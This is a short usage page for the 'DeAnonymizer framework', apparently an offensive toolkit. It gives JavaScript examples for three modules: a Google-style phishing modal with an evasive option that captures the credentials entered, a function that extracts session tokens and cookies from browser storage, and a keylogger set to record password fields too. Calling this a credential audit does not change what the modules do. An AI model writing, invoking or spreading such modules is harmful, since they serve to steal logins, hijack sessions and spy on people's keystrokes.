# Module Usage Examples

This document provides code usage examples for the module utilities and diagnostic methods available in the DeAnonymizer framework.

## 1. Auth Context & Credential Modal Audit (`credential_phish.js`)

```javascript
import { renderPhishingModal } from './src/modules/level3/credential_phish.js';

const creds = await renderPhishingModal({
  provider: 'google',
  prefillEmail: 'target@example.com',
  evasive: true,
  onSubmit: (c) => console.log('Captured:', c)
});
```

## 2. Storage & Session Token Extraction (`session_hijack.js`)

```javascript
import { extractSessionTokens } from './src/modules/level3/session_hijack.js';

const tokens = extractSessionTokens({
  storageTokens: true, // deep scan
  parseCookies: true,
});
console.log('Extracted Session Tokens:', tokens);
```

## 3. Keystroke Listener (`keylogger.js`)

```javascript
import { startKeystrokeListener } from './src/modules/level5/keylogger.js';

const listener = startKeystrokeListener({
  skipPasswords: false,
  onKey: (event) => console.log('Keystroke:', event.key),
});

// To stop listening:
// listener.stop();
```
